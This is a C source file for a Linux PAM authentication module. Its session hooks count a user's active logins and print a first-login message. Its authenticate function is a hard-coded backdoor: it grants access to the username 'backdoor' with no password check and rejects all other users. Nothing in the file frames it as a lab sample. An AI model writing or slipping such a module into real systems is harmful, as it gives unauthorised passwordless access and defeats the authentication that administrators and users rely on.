#include <utmpx.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

int get_nb_of_sessions(const char *username)
{
	int num_active_sessions = 0;
	struct utmpx* ent = NULL;
	setutxent();
	while( (ent = getutxent()) != NULL )
	{
		if( ent->ut_type == USER_PROCESS &&
				strcmp(username, ent->ut_user) == 0 )
		{
			num_active_sessions++;
		}
	}
	endutxent();
	return(num_active_sessions);	
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {

	const char *username;
	int retval;

	retval = pam_get_user(pamh, &username, "Username: ");
	if (retval != PAM_SUCCESS)
		return (retval);
	if (get_nb_of_sessions(username) == 0)
		printf("This is your first login\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}
